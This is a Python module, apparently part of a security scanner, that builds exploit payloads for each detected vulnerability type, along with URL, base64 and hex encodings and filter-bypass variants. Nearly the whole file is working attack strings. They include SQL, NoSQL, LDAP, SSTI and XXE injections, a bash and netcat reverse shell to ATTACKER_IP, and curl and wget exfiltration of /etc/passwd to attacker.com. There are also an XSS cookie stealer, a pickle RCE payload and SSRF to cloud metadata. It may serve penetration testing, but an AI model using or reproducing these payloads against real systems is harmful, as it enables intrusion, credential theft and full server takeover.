"""
Payload Generator — crafts realistic exploit payloads for each vulnerability type.

Each payload includes:
  - raw:         the actual payload string
  - encoded:     URL / base64 / hex variants
  - context:     where/how it would be injected
  - impact:      what a successful exploit achieves
  - bypasses:    common WAF/filter bypass variants
"""

import base64
import urllib.parse
from dataclasses import dataclass
from typing import Any


@dataclass
class Payload:
    name: str
    raw: str
    encoded: dict[str, str]
    context: str
    impact: str
    bypasses: list[str]
    category: str


class PayloadGenerator:
    def generate(self, vuln) -> list[dict]:
        vtype = vuln.vuln_type
        generators = {
            # SQL
            "SQL Injection": self._sql_payloads,
            # Command injection
            "Command Injection (os.system)": self._cmd_payloads,
            "Command Injection (os.popen)": self._cmd_payloads,
            "Command Injection (os.execve)": self._cmd_payloads,
            "Command Injection (os.execvp)": self._cmd_payloads,
            "Command Injection (os.spawnl)": self._cmd_payloads,
            "Command Injection (subprocess)": self._cmd_payloads,
            "Command Injection (Popen)": self._cmd_payloads,
            "Command injection": self._cmd_payloads,
            # Code injection
            "Code Injection (eval)": self._code_injection_payloads,
            "Code Injection (exec)": self._code_injection_payloads,
            "Code Injection (compile)": self._code_injection_payloads,
            "Code injection": self._code_injection_payloads,
            "Arbitrary Module Import": self._code_injection_payloads,
            # Deserialization
            "Unsafe Deserialization (pickle)": self._deserialization_payloads,
            "Unsafe Deserialization (marshal)": self._deserialization_payloads,
            "Unsafe Deserialization (dill)": self._deserialization_payloads,
            "Unsafe Deserialization (joblib)": self._deserialization_payloads,
            "Unsafe YAML Deserialization": self._yaml_payloads,
            "Unsafe YAML load": self._yaml_payloads,
            "Unsafe deserialization": self._deserialization_payloads,
            # Path traversal
            "Path Traversal": self._path_traversal_payloads,
            "Path Traversal (pathlib)": self._path_traversal_payloads,
            "Path Traversal (shutil)": self._path_traversal_payloads,
            # SSRF
            "Server-Side Request Forgery (SSRF)": self._ssrf_payloads,
            "Potential SSRF": self._ssrf_payloads,
            # Crypto
            "Weak Cryptography (MD5)": self._crypto_payloads,
            "Weak Cryptography (SHA-1)": self._crypto_payloads,
            "Weak Cryptography (SHA-224)": self._crypto_payloads,
            "Weak Cryptography (DES)": self._crypto_payloads,
            "Weak Cryptography (RC4)": self._crypto_payloads,
            "Weak cryptography": self._crypto_payloads,
            # Randomness
            "Insecure Randomness": self._insecure_random_payloads,
            "Insecure random — not cryptographically safe": self._insecure_random_payloads,
            # Credentials
            "Hardcoded Password": self._credential_payloads,
            "Hardcoded API Key": self._credential_payloads,
            "Hardcoded Secret / Token": self._credential_payloads,
            "Hardcoded JWT Secret": self._credential_payloads,
            "Hardcoded DB Password": self._credential_payloads,
            "Hardcoded OAuth Secret": self._credential_payloads,
            "Hardcoded AWS Credential": self._aws_credential_payloads,
            "AWS Access Key ID Pattern Exposed": self._aws_credential_payloads,
            "Hardcoded password": self._credential_payloads,
            "Hardcoded API key": self._credential_payloads,
            "Hardcoded secret/token": self._credential_payloads,
            "Hardcoded AWS credential": self._aws_credential_payloads,
            "GitHub Personal Access Token Exposed": self._credential_payloads,
            "Google API Key Exposed": self._credential_payloads,
            "Stripe Live Secret Key Exposed": self._credential_payloads,
            "Slack Token Exposed": self._credential_payloads,
            "Private Key in Source": self._credential_payloads,
            # SSTI
            "Server-Side Template Injection (SSTI)": self._ssti_payloads,
            # XXE
            "XML External Entity (XXE)": self._xxe_payloads,
            # NoSQL
            "NoSQL Injection (MongoDB)": self._nosql_payloads,
            # LDAP
            "LDAP Injection": self._ldap_payloads,
            # Debug / config
            "Debug Mode Enabled in Production": self._config_payloads,
            "SSL Certificate Verification Disabled": self._ssl_bypass_payloads,
            "TLS Verification Bypass": self._ssl_bypass_payloads,
            # XSS
            "XSS": self._xss_payloads,
        }
        gen = generators.get(vtype, self._generic_payloads)
        payloads = gen(vuln)
        return [self._to_dict(p) for p in payloads]

    # ── SQL Injection ─────────────────────────────────────────────────────────

    def _sql_payloads(self, vuln) -> list[Payload]:
        ctx = vuln.context_metadata or {}
        q = ctx.get("quote_char", "'")
        p = ")" if ctx.get("has_parenthesis") else ""
        
        # Surgical breakout prefix
        breakout = f"{p}{q}"
        comment = "--" if q == "'" else "#"

        return [
            Payload(
                name="Surgical AST breakout",
                raw=f"{breakout} OR {q}1{q}={q}1{comment}",
                encoded=self._encode(f"{breakout} OR {q}1{q}={q}1{comment}"),
                context=f"Context-aware breakout for {vuln.vuln_type}",
                impact="Bypasses specific syntax constraints to achieve injection",
                bypasses=[f"{breakout} OR 1=1 {comment}"],
                category="sqli",
            ),
            Payload(
                name="Classic auth bypass",
                raw="' OR '1'='1' --",
                encoded=self._encode("' OR '1'='1' --"),
                context="Login form username/password field",
                impact="Bypasses authentication, grants access to any account",
                bypasses=["' OR 1=1 --", "' OR 'x'='x", "admin'--", "' OR 1=1#"],
                category="sqli",
            ),
            Payload(
                name="UNION-based data extraction",
                raw="' UNION SELECT username,password,3 FROM users --",
                encoded=self._encode("' UNION SELECT username,password,3 FROM users --"),
                context="Any parameter passed into a SELECT query",
                impact="Dumps usernames and password hashes from users table",
                bypasses=[
                    "' UNION/**/SELECT/**/username,password,3/**/FROM/**/users--",
                    "' UNION SELECT user(),version(),3--",
                    "' uNiOn SeLeCt username,password,3 FROM users--",
                ],
                category="sqli",
            ),
            Payload(
                name="Boolean blind extraction",
                raw="' AND SUBSTRING(password,1,1)='a' --",
                encoded=self._encode("' AND SUBSTRING(password,1,1)='a' --"),
                context="Any parameter — infer data from true/false responses",
                impact="Extracts full database content character by character",
                bypasses=["' AND MID(password,1,1)='a'--", "' AND ASCII(SUBSTR(password,1,1))=97--"],
                category="sqli",
            ),
            Payload(
                name="Time-based blind (stealthy)",
                raw="'; IF (1=1) WAITFOR DELAY '0:0:5'--",
                encoded=self._encode("'; IF (1=1) WAITFOR DELAY '0:0:5'--"),
                context="Parameters where output is not reflected — detect via response time",
                impact="Confirms injection and enables blind data extraction via timing",
                bypasses=[
                    "'; SELECT SLEEP(5)--",
                    "' OR SLEEP(5)--",
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                ],
                category="sqli",
            ),
            Payload(
                name="Stacked query / RCE via xp_cmdshell",
                raw="'; EXEC xp_cmdshell('whoami')--",
                encoded=self._encode("'; EXEC xp_cmdshell('whoami')--"),
                context="MSSQL server with xp_cmdshell enabled",
                impact="Remote code execution on database server",
                bypasses=["'; EXEC master..xp_cmdshell('ping attacker.com')--"],
                category="sqli",
            ),
        ]

    # ── Command Injection ─────────────────────────────────────────────────────

    def _cmd_payloads(self, vuln) -> list[Payload]:
        return [
            Payload(
                name="Basic command injection",
                raw="; id",
                encoded=self._encode("; id"),
                context="Any parameter passed to os.system() or subprocess",
                impact="Executes arbitrary OS commands as the application user",
                bypasses=["; id #", "| id", "|| id", "& id", "&& id", "`id`", "$(id)"],
                category="cmdi",
            ),
            Payload(
                name="Reverse shell",
                raw="bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
                encoded=self._encode("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"),
                context="Command injection vector with network access",
                impact="Full interactive reverse shell — complete server compromise",
                bypasses=[
                    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);subprocess.call([\"/bin/sh\"])'",
                    "nc -e /bin/sh ATTACKER_IP 4444",
                    "/bin/sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
                ],
                category="cmdi",
            ),
            Payload(
                name="File read via injection",
                raw="; cat /etc/passwd",
                encoded=self._encode("; cat /etc/passwd"),
                context="Command injection in any input field",
                impact="Reads system files — can reveal credentials, user accounts",
                bypasses=["| cat /etc/passwd", "; cat${IFS}/etc/passwd", ";c'a't /etc/passwd"],
                category="cmdi",
            ),
            Payload(
                name="Out-of-band data exfil",
                raw="; curl http://attacker.com/$(whoami)",
                encoded=self._encode("; curl http://attacker.com/$(whoami)"),
                context="Server with outbound HTTP access",
                impact="Exfiltrates command output to attacker-controlled server",
                bypasses=["; wget http://attacker.com/`id`", "; curl http://attacker.com/?d=$(cat /etc/passwd|base64)"],
                category="cmdi",
            ),
        ]

    # ── Code Injection (eval/exec) ────────────────────────────────────────────

    def _code_injection_payloads(self, vuln) -> list[Payload]:
        return [
            Payload(
                name="OS command via eval",
                raw="__import__('os').system('id')",
                encoded=self._encode("__import__('os').system('id')"),
                context="Any user input passed to eval() or exec()",
                impact="Arbitrary code execution in Python runtime",
                bypasses=[
                    "__import__('os').popen('id').read()",
                    "getattr(__import__('os'), 'system')('id')",
                ],
                category="code_injection",
            ),
            Payload(
                name="Sandbox escape via builtins",
                raw="[c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('id')",
                encoded={},
                context="Restricted eval() environments with filtered globals",
                impact="Escapes restricted Python sandbox, achieves code execution",
                bypasses=[],
                category="code_injection",
            ),
            Payload(
                name="File write via exec",
                raw="exec(open('/tmp/shell.py','w').write('import os; os.system(\"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\")'))",
                encoded={},
                context="exec() with writable filesystem",
                impact="Writes a persistent backdoor to disk",
                bypasses=[],
                category="code_injection",
            ),
        ]

    # ── Unsafe Deserialization ────────────────────────────────────────────────

    def _deserialization_payloads(self, vuln) -> list[Payload]:
        pickle_payload_b64 = base64.b64encode(
            b"cos\nsystem\n(S'id'\ntR."
        ).decode()
        return [
            Payload(
                name="pickle RCE payload (base64)",
                raw=pickle_payload_b64,
                encoded={"base64": pickle_payload_b64},
                context="Any endpoint accepting pickled data (cookies, POST body, files)",
                impact="Remote code execution — pickle.loads() executes __reduce__ on attacker object",
                bypasses=["Encode as hex, gzip+base64, or multipart upload"],
                category="deserialization",
            ),
            Payload(
                name="YAML unsafe load RCE",
                raw="!!python/object/apply:os.system ['id']",
                encoded=self._encode("!!python/object/apply:os.system ['id']"),
                context="yaml.load() without Loader=yaml.SafeLoader",
                impact="Executes arbitrary Python object constructors — full RCE",
                bypasses=["!!python/object/apply:subprocess.check_output [['id']]"],
                category="deserialization",
            ),
        ]

    # ── Path Traversal ────────────────────────────────────────────────────────

    def _path_traversal_payloads(self, vuln) -> list[Payload]:
        traversal = "../../../etc/passwd"
        return [
            Payload(
                name="Classic path traversal",
                raw=traversal,
                encoded=self._encode(traversal),
                context="File download/read endpoints with user-controlled filename",
                impact="Reads arbitrary files including /etc/passwd, /etc/shadow, SSH keys",
                bypasses=[
                    "....//....//....//etc/passwd",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%252f..%252f..%252fetc%252fpasswd",
                    "..%c0%af..%c0%af..%c0%afetc/passwd",
                ],
                category="path_traversal",
            ),
            Payload(
                name="Absolute path injection",
                raw="/etc/shadow",
                encoded=self._encode("/etc/shadow"),
                context="Parameters where server joins user input with a base path",
                impact="Direct read of password shadow file if running as root",
                bypasses=["/etc/./shadow", "/etc/../etc/shadow"],
                category="path_traversal",
            ),
            Payload(
                name="Config file leak",
                raw="../../config.py",
                encoded=self._encode("../../config.py"),
                context="Django/Flask apps where source layout is guessable",
                impact="Leaks database credentials, secret key, API tokens",
                bypasses=["../../settings.py", "../../.env", "../../app.cfg"],
                category="path_traversal",
            ),
        ]

    # ── SSRF ──────────────────────────────────────────────────────────────────

    def _ssrf_payloads(self, vuln) -> list[Payload]:
        return [
            Payload(
                name="AWS metadata endpoint",
                raw="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                encoded=self._encode("http://169.254.169.254/latest/meta-data/"),
                context="Any parameter where user controls a URL fetched server-side",
                impact="Leaks AWS IAM credentials — full cloud account takeover possible",
                bypasses=[
                    "http://169.254.169.254.attacker.com/latest/meta-data/",
                    "http://[::ffff:169.254.169.254]/latest/meta-data/",
                    "http://0xA9FEA9FE/latest/meta-data/",
                ],
                category="ssrf",
            ),
            Payload(
                name="Internal network scan",
                raw="http://192.168.1.1/admin",
                encoded=self._encode("http://192.168.1.1/admin"),
                context="SSRF to pivot into internal network",
                impact="Access internal services not exposed publicly",
                bypasses=["http://0177.0.0.1/admin", "http://2130706433/admin"],
                category="ssrf",
            ),
            Payload(
                name="File protocol read",
                raw="file:///etc/passwd",
                encoded=self._encode("file:///etc/passwd"),
                context="Libraries that allow file:// scheme",
                impact="Local file inclusion via SSRF",
                bypasses=["file://localhost/etc/passwd"],
                category="ssrf",
            ),
        ]

    # ── YAML ──────────────────────────────────────────────────────────────────

    def _yaml_payloads(self, vuln) -> list[Payload]:
        return [
            Payload(
                name="YAML object injection RCE",
                raw="!!python/object/apply:os.system ['whoami']",
                encoded={},
                context="yaml.load() call without SafeLoader",
                impact="Executes OS command during YAML parsing",
                bypasses=["!!python/object/new:os.system ['id']"],
                category="deserialization",
            ),
        ]

    # ── Crypto / Credential ───────────────────────────────────────────────────

    def _crypto_payloads(self, vuln) -> list[Payload]:
        return [
            Payload(
                name="MD5/SHA1 collision demonstration",
                raw="[Preimage attack feasible — use SHA-256 or bcrypt]",
                encoded={},
                context="Password hashing or integrity checking",
                impact="Passwords crackable via rainbow tables or GPU bruteforce in minutes",
                bypasses=[],
                category="crypto_weakness",
            ),
        ]

    def _credential_payloads(self, vuln) -> list[Payload]:
        return [
            Payload(
                name="Credential exposure",
                raw="[Hardcoded credential found in source — rotate immediately]",
                encoded={},
                context="Version control, logs, error pages",
                impact="Anyone with repo access can authenticate as this credential",
                bypasses=[],
                category="credential_leak",
            ),
        ]

    def _xss_payloads(self, vuln) -> list[Payload]:
        return [
            Payload(
                name="Reflected XSS",
                raw='<script>document.location="http://attacker.com/steal?c="+document.cookie</script>',
                encoded=self._encode('<script>alert(1)</script>'),
                context="Any user input reflected in HTML response without encoding",
                impact="Session hijacking, credential theft, full account takeover",
                bypasses=['<img src=x onerror=alert(1)>', '<svg onload=alert(1)>', '"><script>alert(1)</script>'],
                category="xss",
            ),
        ]

    def _generic_payloads(self, vuln) -> list[Payload]:
        return [
            Payload(
                name=f"Generic {vuln.vuln_type} probe",
                raw="[Manual analysis required]",
                encoded={},
                context=vuln.description,
                impact="Depends on context — review code manually",
                bypasses=[],
                category="generic",
            ),
        ]

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _encode(self, s: str) -> dict[str, str]:
        return {
            "url":    urllib.parse.quote(s),
            "double_url": urllib.parse.quote(urllib.parse.quote(s)),
            "base64": base64.b64encode(s.encode()).decode(),
            "hex":    s.encode().hex(),
        }

    def _to_dict(self, p: Payload) -> dict:
        return {
            "name": p.name,
            "raw": p.raw,
            "encoded": p.encoded,
            "context": p.context,
            "impact": p.impact,
            "bypasses": p.bypasses,
            "category": p.category,
        }

    # ── SSTI (Server-Side Template Injection) ─────────────────────────────────

    def _ssti_payloads(self, vuln) -> list[Payload]:
        payloads = [
            ("SSTI — Math probe", "{{7*7}}", "template expression field", "Confirms template execution if output is 49"),
            ("SSTI — Config dump", "{{config}}", "template context", "Dumps application config including secret keys"),
            ("SSTI — RCE via MRO", "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}", "Jinja2 template", "Full OS command execution via Python MRO chain"),
            ("SSTI — OS popen", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "Flask/Jinja2 context", "Executes OS commands through Flask globals"),
        ]
        return [Payload(name=n, raw=r, encoded=self._encode(r), context=c, impact=i, bypasses=[], category="ssti") for n, r, c, i in payloads]

    # ── XXE (XML External Entity) ─────────────────────────────────────────────

    def _xxe_payloads(self, vuln) -> list[Payload]:
        payloads = [
            ("XXE — /etc/passwd", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "XML document body", "Reads /etc/passwd — confirms XXE file disclosure"),
            ("XXE — /etc/shadow", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>', "XML document body", "Reads shadow password file — credential theft"),
            ("XXE — SSRF probe", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>', "XML document body", "SSRF via XXE — AWS/GCP metadata extraction"),
            ("XXE — Blind OOB", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><root/>', "XML document body", "Out-of-band data exfiltration via external DTD"),
        ]
        return [Payload(name=n, raw=r, encoded=self._encode(r), context=c, impact=i, bypasses=[], category="xxe") for n, r, c, i in payloads]

    # ── NoSQL Injection ───────────────────────────────────────────────────────

    def _nosql_payloads(self, vuln) -> list[Payload]:
        payloads = [
            ("NoSQL — Auth bypass ($ne)", '{"username": {"$ne": null}, "password": {"$ne": null}}', "JSON POST body / query dict", "Bypasses login — $ne operator matches any non-null value"),
            ("NoSQL — Auth bypass ($gt)", '{"username": "admin", "password": {"$gt": ""}}', "JSON POST body", "Password greater-than empty string — always true"),
            ("NoSQL — Regex dump ($regex)", '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}', "MongoDB query dict", "Returns all users via regex wildcard match"),
            ("NoSQL — $where JS injection", '{"$where": "this.username == \'admin\' || true"}', "MongoDB $where clause", "JavaScript injection — server-side JS execution in MongoDB"),
        ]
        return [Payload(name=n, raw=r, encoded=self._encode(r), context=c, impact=i, bypasses=[], category="nosql") for n, r, c, i in payloads]

    # ── LDAP Injection ────────────────────────────────────────────────────────

    def _ldap_payloads(self, vuln) -> list[Payload]:
        payloads = [
            ("LDAP — Auth bypass (*)", "*", "username/search field", "Wildcard matches all LDAP entries — authentication bypass"),
            ("LDAP — Admin bypass", "admin)(&(objectClass=*)(|(uid=*", "LDAP filter injection point", "Injects OR condition to bypass authentication"),
            ("LDAP — Dump all users", "*))(|(objectClass=*", "LDAP search filter", "Dumps all directory objects via filter manipulation"),
            ("LDAP — Boolean injection", "admin)(password=*", "LDAP bind DN field", "Blind LDAP injection to enumerate attributes"),
        ]
        return [Payload(name=n, raw=r, encoded=self._encode(r), context=c, impact=i, bypasses=[], category="ldap") for n, r, c, i in payloads]

    # ── AWS Credential Exposure ───────────────────────────────────────────────

    def _aws_credential_payloads(self, vuln) -> list[Payload]:
        payloads = [
            ("AWS — IMDS metadata", "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/", "attacker terminal", "Queries instance metadata to obtain temporary IAM credentials"),
            ("AWS — STS whoami", "aws sts get-caller-identity", "attacker CLI with leaked key", "Identifies the AWS account and role of the exposed credential"),
            ("AWS — S3 bucket list", "aws s3 ls --recursive s3://", "attacker CLI", "Lists all accessible S3 buckets and objects"),
            ("AWS — IAM enum", "aws iam list-users && aws iam list-roles", "attacker CLI", "Enumerates all IAM users and roles for privilege escalation"),
        ]
        return [Payload(name=n, raw=r, encoded=self._encode(r), context=c, impact=i, bypasses=[], category="credential") for n, r, c, i in payloads]

    # ── Insecure Random ───────────────────────────────────────────────────────

    def _insecure_random_payloads(self, vuln) -> list[Payload]:
        payloads = [
            ("Random — State prediction", "import random; r = random.Random(); [r.setstate((3, tuple([int(x) for x in observed_outputs]), None))]", "attacker script", "Mersenne Twister state can be recovered from 624 outputs"),
            ("Random — Token brute force", "python3 -c \"import random; [print(random.randint(100000,999999)) for _ in range(1000)]\"", "attacker terminal", "Brute-force small token space — 900k possibilities"),
            ("Random — Seed timing attack", "import random, time; random.seed(int(time.time())); print(random.randint(0,99999))", "attacker prediction", "If seeded with timestamp, token is guessable within seconds"),
        ]
        return [Payload(name=n, raw=r, encoded=self._encode(r), context=c, impact=i, bypasses=[], category="randomness") for n, r, c, i in payloads]

    # ── Config / Debug Issues ─────────────────────────────────────────────────

    def _config_payloads(self, vuln) -> list[Payload]:
        payloads = [
            ("Debug — Stack trace extraction", "GET /non-existent-route HTTP/1.1", "HTTP request", "Debug mode returns full stack traces with code snippets and local vars"),
            ("Debug — Flask interactive debugger", "GET /__debugger__ HTTP/1.1 (Werkzeug)", "browser", "Werkzeug debug console allows arbitrary Python execution in browser"),
            ("Debug — Env var dump", "GET /debug/env or /?debug=1", "HTTP parameter", "Debug endpoints often expose environment variables including secrets"),
        ]
        return [Payload(name=n, raw=r, encoded=self._encode(r), context=c, impact=i, bypasses=[], category="config") for n, r, c, i in payloads]

    def _ssl_bypass_payloads(self, vuln) -> list[Payload]:
        payloads = [
            ("SSL bypass — MITM intercept", "mitmproxy --ssl-insecure -p 8080", "attacker network position", "Intercept all HTTPS traffic with self-signed cert — no verification"),
            ("SSL bypass — Cert substitution", "openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=target.com'", "attacker controlled server", "Replace valid cert — client accepts due to verify=False"),
        ]
        return [Payload(name=n, raw=r, encoded=self._encode(r), context=c, impact=i, bypasses=[], category="ssl") for n, r, c, i in payloads]
